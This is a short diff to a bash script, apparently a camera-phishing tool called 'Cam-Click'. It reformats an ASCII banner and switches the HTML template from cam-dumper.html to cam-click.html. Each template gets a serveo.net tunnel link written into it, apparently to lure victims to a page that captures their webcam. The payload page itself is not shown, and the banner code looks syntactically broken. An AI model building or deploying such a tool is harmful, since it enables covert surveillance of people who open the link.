@@ -25,11 +25,12 @@ fi
 trap 'printf "\n";stop' 2
 
 banner() {
-printf("   ___                        ___ _ _      _ \n")
-printf("  / __\__ _ _ __ ___         / __\ (_) ___| | __\n")
-printf(" / /  / _` | '_ ` _ \ _____ / /  | | |/ __| |/ /\n")
-printf("/ /__| (_| | | | | | |_____/ /___| | | (__|   < \n")
-printf("\____/\__,_|_| |_| |_|     \____/|_|_|\___|_|\_\\n")
+printf("
+   ___                        ___ _ _      _ 
+  / __\__ _ _ __ ___         / __\ (_) ___| | __
+ / /  / _` | '_ ` _ \ _____ / /  | | |/ __| |/ /
+/ /__| (_| | | | | | |_____/ /___| | | (__|   < 
+\____/\__,_|_| |_| |_|     \____/|_|_|\___|_|\_\\n")
 
 
 printf " \e[1;77m tool created by Mayank Rajput [hackelite01]\e[0m \n"
@@ -151,7 +152,7 @@ fi
 link=${link#$q}
 link=${link%$q}
 
-sed 's+forwarding_link+'$link'+g' cam-dumper.html > index2.html
+sed 's+forwarding_link+'$link'+g' cam-click.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -248,7 +249,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' cam-dumper.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' cam-click.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
